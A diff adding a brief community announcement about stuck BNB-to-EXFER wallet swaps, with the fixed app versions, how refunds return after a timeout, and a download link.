@@ -1,0 +1,9 @@
+@everyone
+
+we noticed some BNB → EXFER swaps were getting stuck on "in progress" over the past day. it's fixed now.
+
+if one of yours didn't finish: update to the latest version (mobile v1.0.17 / desktop v0.16.13) and open your wallet — it returns your BNB automatically. the on-chain timeout is up to 4 hours from when you swapped, so if it's been longer and your BNB still isn't back, just reopen the wallet.
+
+download: https://exfer-stack.github.io/get/
+
+sorry for the trouble.
